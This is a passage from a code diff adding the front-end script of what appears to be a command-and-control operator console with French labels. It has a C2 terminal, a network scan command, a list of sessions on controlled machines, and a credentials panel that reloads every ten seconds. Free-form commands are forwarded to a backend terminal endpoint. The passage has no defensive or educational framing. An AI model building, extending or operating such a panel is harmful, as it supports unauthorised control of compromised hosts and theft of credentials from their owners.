+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        document.getElementById('terminalInput').addEventListener('keypress', async (e) => {
+            if (e.key === 'Enter') {
+                const input = e.target;
+                const cmd = input.value;
+                if (!cmd) return;
+                
+                appendTerminal(`$ ${cmd}`);
+                input.value = '';
+                
+                if (cmd === 'clear') {
+                    document.getElementById('terminalOutput').innerHTML = '';
+                    appendTerminal('[SYSTEM] Terminal C2 prêt');
+                    return;
+                }
+                
+                if (cmd === 'help') {
+                    appendTerminal('Commandes disponibles:');
+                    appendTerminal('  scan <target> - Scan réseau');
+                    appendTerminal('  sessions - Liste des sessions');
+                    appendTerminal('  help - Cette aide');
+                    appendTerminal('  clear - Effacer');
+                    return;
+                }
+                
+                if (cmd.startsWith('scan ')) {
+                    const target = cmd.substring(5);
+                    document.getElementById('scanTarget').value = target;
+                    document.querySelector('[data-page="#page-scan"]').click();
+                    document.getElementById('scanBtn').click();
+                    return;
+                }
+                
+                if (cmd === 'sessions') {
+                    loadSessions();
+                    document.querySelector('[data-page="#page-sessions"]').click();
+                    return;
+                }
+                
+                try {
+                    const res = await fetch(`${API_BASE}/terminal`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({command: cmd})
+                    });
+                    const data = await res.json();
+                    if (data.output) appendTerminal(data.output);
+                } catch(e) {
+                    appendTerminal(`Erreur: ${e.message}`);
+                }
+            }
+        });
+        
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        // Initialisation
+        connectWebSocket();
+        updateStats();
+        loadCredentials();
+        loadSessions();
+        
+        setInterval(() => {
+            updateStats();
+            loadCredentials();
+            loadSessions();
+        }, 10000);
+    </script>
+</body>
+</html>
